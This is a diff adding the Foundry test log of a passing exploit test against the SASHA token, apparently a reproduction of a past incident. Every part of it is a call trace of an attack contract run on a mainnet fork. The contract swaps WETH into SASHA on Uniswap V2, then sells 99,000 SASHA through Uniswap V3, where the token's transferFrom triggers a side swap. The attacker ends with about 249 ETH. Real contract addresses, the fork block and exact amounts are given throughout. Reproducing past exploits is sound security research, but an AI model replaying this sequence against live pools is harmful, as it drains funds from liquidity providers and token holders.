@@ -1,0 +1,184 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SASHAToken_exp.sol:SASHAToken_exp
+[PASS] testExploit() (gas: 1203931)
+Logs:
+  balance:  249206511929373786924
+
+Traces:
+  [11080] SASHAToken_exp::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 20905301 [2.09e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(SASHA: [0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6], "SASHA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], "Uniswap V2: Router 2")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Uniswap V3: Router 2: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], "Uniswap V3: Router 2")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], "Uniswap V2: SASHA 21")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Attacker: [0x81F48A87Ec44208c691f870b9d400D9c13111e2E], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(Attacker: [0x81F48A87Ec44208c691f870b9d400D9c13111e2E], 1000000000000000000 [1e18])
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1272031] SASHAToken_exp::testExploit()
+    ├─ [0] VM::startPrank(Attacker: [0x81F48A87Ec44208c691f870b9d400D9c13111e2E])
+    │   └─ ← [Return]
+    ├─ [757128] → new SASHAToken_AttackContract@0x36C44e078A0AF99e28909567AC2F63523466F49B
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x00000000000000000000000081f48a87ec44208c691f870b9d400d9c13111e2e
+    │   └─ ← [Return] 3671 bytes of code
+    ├─ [41] SASHAToken_AttackContract::fallback{value: 80000000000000000}()
+    │   └─ ← [Stop]
+    ├─ [457277] SASHAToken_AttackContract::attack()
+    │   ├─ [24420] WETH::approve(Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], spender: Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x2b9fee5e16378c6b703b6dffbe319e7123efabc52bb7a1f68f6f1e6ba5411882: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [25302] SASHA::approve(Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], spender: Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6e14a13172862509e8ee9ac3d3e20905a0e62893657176bbd95ed3b90e67111f: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [25302] SASHA::approve(Uniswap V3: Router 2: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], spender: Uniswap V3: Router 2: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9fe7e4d1906eec7b768fc50bbf2bc5273c24d437ecca2f48f485a2f1b49ca811: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [23974] WETH::deposit{value: 70000000000000000}()
+    │   │   ├─ emit Deposit(dst: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], wad: 70000000000000000 [7e16])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x580236aa1b46c42915b24b052c6aba6dcb32ebdaa487640f7b57cd46e11b39e6: 0 → 0x00000000000000000000000000000000000000000000000000f8b0a10e470000
+    │   │   └─ ← [Stop]
+    │   ├─ [112613] Uniswap V2: Router 2::swapExactTokensForTokensSupportingFeeOnTransferTokens(70000000000000000 [7e16], 1, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6], SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 4324324234244 [4.324e12])
+    │   │   ├─ [8225] WETH::transferFrom(SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], 70000000000000000 [7e16])
+    │   │   │   ├─ emit Transfer(from: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], to: Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], value: 70000000000000000 [7e16])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x580236aa1b46c42915b24b052c6aba6dcb32ebdaa487640f7b57cd46e11b39e6: 0x00000000000000000000000000000000000000000000000000f8b0a10e470000 → 0
+    │   │   │   │   @ 0xf090606e6bf07acb77d67869e38e068fbd518d5dbac5d62273cbcabc14b1e71e: 0x0000000000000000000000000000000000000000000000036941ed3cfde91747 → 0x0000000000000000000000000000000000000000000000036a3a9dde0c301747
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2918] SASHA::balanceOf(SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [2504] Uniswap V2: SASHA 21::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 62924836314811012935 [6.292e19], 128443370696019410275540367 [1.284e26], 1728200831 [1.728e9]
+    │   │   ├─ [534] WETH::balanceOf(Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]) [staticcall]
+    │   │   │   └─ ← [Return] 62994836314811012935 [6.299e19]
+    │   │   ├─ [87872] Uniswap V2: SASHA 21::swap(0, 142298849366578503610012 [1.422e23], SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 0x)
+    │   │   │   ├─ [55097] SASHA::transfer(SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 142298849366578503610012 [1.422e23])
+    │   │   │   │   ├─ emit Transfer(from: Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], to: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], value: 142298849366578503610012 [1.422e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2dcc020bbf8a7e575d52720488b19859e33dd03b2a457ec0cff130a57ba33e3b: 0x0000000000000000000000000000000000000000006a3ef113d6fdd7f7a81d8f → 0x0000000000000000000000000000000000000000006a20cf0a9a5e8e74b42ef3
+    │   │   │   │   │   @ 0x2361c7d929ad166ac27c1ac9db76126f64ade84fb552df92432c308b399b00b2: 0 → 0x000000000000000000000000000000000000000000001e22093c9f4982f3ee9c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]) [staticcall]
+    │   │   │   │   └─ ← [Return] 62994836314811012935 [6.299e19]
+    │   │   │   ├─ [918] SASHA::balanceOf(Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]) [staticcall]
+    │   │   │   │   └─ ← [Return] 128301071846652831771930355 [1.283e26]
+    │   │   │   ├─ emit Sync(reserve0: 62994836314811012935 [6.299e19], reserve1: 128301071846652831771930355 [1.283e26])
+    │   │   │   ├─ emit Swap(sender: Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 70000000000000000 [7e16], amount1In: 0, amount0Out: 0, amount1Out: 142298849366578503610012 [1.422e23], to: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6702407f0000006a3ef113d6fdd7f7a81d8f0000000000036941ed3cfde91747 → 0x6702494f0000006a20cf0a9a5e8e74b42ef30000000000036a3a9dde0c301747
+    │   │   │   │   @ 9: 0x000000000000000000000000038187e207ce44dcb274ca4fcbf4f6d53aa3db4c → 0x00000000000000000000000003829a5c9a22f62d67439ae07799d49ff2413e0c
+    │   │   │   │   @ 10: 0x0000000000000000000000000000000000000225af3d628fe048575b63f58b0c → 0x000000000000000000000000000000000000026e1dc9739aabe0559839804dac
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [918] SASHA::balanceOf(SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B]) [staticcall]
+    │   │   │   └─ ← [Return] 142298849366578503610012 [1.422e23]
+    │   │   └─ ← [Stop]
+    │   ├─ [8397] SASHA::transfer(Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], 1000000000000000000 [1e18])
+    │   │   ├─ emit Transfer(from: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], to: Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], value: 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x2361c7d929ad166ac27c1ac9db76126f64ade84fb552df92432c308b399b00b2: 0x000000000000000000000000000000000000000000001e22093c9f4982f3ee9c → 0x000000000000000000000000000000000000000000001e21fb5be895db8fee9c
+    │   │   │   @ 0x2dcc020bbf8a7e575d52720488b19859e33dd03b2a457ec0cff130a57ba33e3b: 0x0000000000000000000000000000000000000000006a20cf0a9a5e8e74b42ef3 → 0x0000000000000000000000000000000000000000006a20cf187b15421c182ef3
+    │   │   └─ ← [Return] true
+    │   ├─ [202796] Uniswap V3: Router 2::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 10000 [1e4], recipient: 0x36C44e078A0AF99e28909567AC2F63523466F49B, amountIn: 99000000000000000000000 [9.9e22], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   ├─ [195371] 0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264::swap(SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], false, 99000000000000000000000 [9.9e22], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000036c44e078a0af99e28909567ac2f63523466f49b000000000000000000000000000000000000000000000000000000000000002bd1456d1b9ceb59abd4423a49d40942a9485ceef6002710c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
+    │   │   │   ├─ [27962] WETH::transfer(SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 249276511929373786924 [2.492e20])
+    │   │   │   │   ├─ emit Transfer(from: 0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264, to: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], value: 249276511929373786924 [2.492e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x580236aa1b46c42915b24b052c6aba6dcb32ebdaa487640f7b57cd46e11b39e6: 0 → 0x00000000000000000000000000000000000000000000000d836812e04ebf832c
+    │   │   │   │   │   @ 0x8932c50ce880b703c8d539a263c55abc37b2fd6c87920f3e0d6f43467325912e: 0x00000000000000000000000000000000000000000000000d95179c130e6b3ffe → 0x00000000000000000000000000000000000000000000000011af8932bfabbcd2
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2918] SASHA::balanceOf(0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264) [staticcall]
+    │   │   │   │   └─ ← [Return] 501057216497825691871 [5.01e20]
+    │   │   │   ├─ [109780] Uniswap V3: Router 2::uniswapV3SwapCallback(-249276511929373786924 [-2.492e20], 99000000000000000000000 [9.9e22], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000036c44e078a0af99e28909567ac2f63523466f49b000000000000000000000000000000000000000000000000000000000000002bd1456d1b9ceb59abd4423a49d40942a9485ceef6002710c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [105673] SASHA::transferFrom(SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264, 99000000000000000000000 [9.9e22])
+    │   │   │   │   │   ├─ [275] Uniswap V2: Router 2::WETH() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   │   │   ├─ [75538] Uniswap V2: Router 2::swapExactTokensForETHSupportingFeeOnTransferTokens(0, 0, [0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x81164C9eDAB507Aa4baC08dCeccEFabA1340d3b7, 1728203087 [1.728e9])
+    │   │   │   │   │   │   ├─ [8951] SASHA::transferFrom(SASHA: [0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6], Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], 0)
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: SASHA: [0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6], spender: Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 0)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: SASHA: [0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6], to: Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], value: 0)
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [504] Uniswap V2: SASHA 21::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 62994836314811012935 [6.299e19], 128301071846652831771930355 [1.283e26], 1728203087 [1.728e9]
+    │   │   │   │   │   │   ├─ [918] SASHA::balanceOf(Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 128301072846652831771930355 [1.283e26]
+    │   │   │   │   │   │   ├─ [38721] Uniswap V2: SASHA 21::swap(489519303415 [4.895e11], 0, Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0x)
+    │   │   │   │   │   │   │   ├─ [25162] WETH::transfer(Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 489519303415 [4.895e11])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], to: Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 489519303415 [4.895e11])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xf090606e6bf07acb77d67869e38e068fbd518d5dbac5d62273cbcabc14b1e71e: 0x0000000000000000000000000000000000000000000000036a3a9dde0c301747 → 0x0000000000000000000000000000000000000000000000036a3a9d6c12904c50
+    │   │   │   │   │   │   │   │   │   @ 0xfb19a963956c9cb662dd3ae48988c4b90766df71ea130109840abe0a1b23dba8: 0 → 0x00000000000000000000000000000000000000000000000000000071f99fcaf7
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 62994835825291709520 [6.299e19]
+    │   │   │   │   │   │   │   ├─ [918] SASHA::balanceOf(Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 128301072846652831771930355 [1.283e26]
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 62994835825291709520 [6.299e19], reserve1: 128301072846652831771930355 [1.283e26])
+    │   │   │   │   │   │   │   ├─ emit Swap(sender: Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 1000000000000000000 [1e18], amount0Out: 489519303415 [4.895e11], amount1Out: 0, to: Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 8: 0x6702494f0000006a20cf0a9a5e8e74b42ef30000000000036a3a9dde0c301747 → 0x6702494f0000006a20cf187b15421c182ef30000000000036a3a9d6c12904c50
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 489519303415 [4.895e11]
+    │   │   │   │   │   │   ├─ [9223] WETH::withdraw(489519303415 [4.895e11])
+    │   │   │   │   │   │   │   ├─ [83] Uniswap V2: Router 2::receive{value: 489519303415}()
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Withdrawal(src: Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], wad: 489519303415 [4.895e11])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xfb19a963956c9cb662dd3ae48988c4b90766df71ea130109840abe0a1b23dba8: 0x00000000000000000000000000000000000000000000000000000071f99fcaf7 → 0
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [0] 0x81164C9eDAB507Aa4baC08dCeccEFabA1340d3b7::fallback{value: 489519303415}()
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Transfer(from: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], to: 0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264, value: 99000000000000000000000 [9.9e22])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2361c7d929ad166ac27c1ac9db76126f64ade84fb552df92432c308b399b00b2: 0x000000000000000000000000000000000000000000001e21fb5be895db8fee9c → 0x00000000000000000000000000000000000000000000092b2e5db510c3afee9c
+    │   │   │   │   │   │   @ 0x4fdabca64bc7f5bb7bcabd48c0349db2a7b8228d2ae454d8f2a83ebcf224e337: 0x00000000000000000000000000000000000000000000001b2990d3b09ae538df → 0x000000000000000000000000000000000000000000001511f68f0735b2c538df
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [918] SASHA::balanceOf(0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264) [staticcall]
+    │   │   │   │   └─ ← [Return] 99501057216497825691871 [9.95e22]
+    │   │   │   ├─ emit Swap(param0: Uniswap V3: Router 2: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], param1: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], param2: -249276511929373786924 [-2.492e20], param3: 99000000000000000000000 [9.9e22], param4: 22027891512936392558277287926453 [2.202e31], param5: 354316710060836269551 [3.543e20], param6: 112560 [1.125e5])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 0x000100000100010000001b1200000000000000016a05c75217b620ed4e6c4333 → 0x00010000010001000001b7b0000000000000011607f4cb80083769e2f802dab5
+    │   │   │   │   @ 8: 0x010000000000000000000008aaf21c101186fddacc00000007b0604867023113 → 0x010000000000000000000009edf19b1efad70d4b160000000a4068806702494f
+    │   │   │   │   @ 2: 0x00000000000000000000000000000000000000187dc2636b22bc4d7dbacc5152 → 0x00000000000000000000000000000002cb4ad197a98ffa22ae2f0eafb09b5494
+    │   │   │   └─ ← [Return] -249276511929373786924 [-2.492e20], 99000000000000000000000 [9.9e22]
+    │   │   └─ ← [Return] 249276511929373786924 [2.492e20]
+    │   ├─ [9181] WETH::withdraw(249276511929373786924 [2.492e20])
+    │   │   ├─ [41] SASHAToken_AttackContract::fallback{value: 249276511929373786924}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Withdrawal(src: SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], wad: 249276511929373786924 [2.492e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x580236aa1b46c42915b24b052c6aba6dcb32ebdaa487640f7b57cd46e11b39e6: 0x00000000000000000000000000000000000000000000000d836812e04ebf832c → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [7304] SASHAToken_AttackContract::withdraw()
+    │   ├─ [0] Attacker::fallback{value: 249286511929373786924}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] console::log("balance: ", 249206511929373786924 [2.492e20]) [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.05s (11.32s CPU time)
+
+Ran 1 test suite in 15.59s (13.05s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
